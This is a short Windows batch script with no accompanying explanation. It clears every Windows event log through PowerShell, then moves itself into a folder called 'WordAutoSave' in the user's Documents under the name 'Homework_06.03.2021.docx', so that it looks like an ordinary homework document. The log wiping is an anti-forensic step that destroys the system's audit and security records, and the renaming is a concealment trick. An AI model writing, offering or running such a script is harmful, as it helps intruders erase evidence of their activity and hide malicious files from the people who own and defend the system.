@echo off
powershell -noprofile -command "Get-EventLog -LogName * | ForEach { Clear-EventLog $_.Log }"

cd C:\Users\%USERNAME%\Documents
md WordAutoSave

move %0 C:\Users\%USERNAME%\Documents\WordAutoSave\Homework_06.03.2021.docx


